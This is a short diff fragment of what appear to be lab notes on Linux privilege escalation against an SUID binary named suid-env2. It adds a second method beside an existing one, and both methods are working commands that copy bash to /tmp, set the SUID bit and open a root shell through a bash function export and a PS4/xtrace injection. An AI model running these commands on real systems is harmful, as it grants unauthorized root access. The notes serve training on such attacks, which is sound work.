@@ -416,4 +416,8 @@ when we run strings /usr/local/bin/suid-env2 and find full path is used then we 
 
 1)function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 
-2)export -f /usr/sbin/service
+2)export -f /usr/sbin/service  
+
+Method-2:--
+-----------------------
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'  
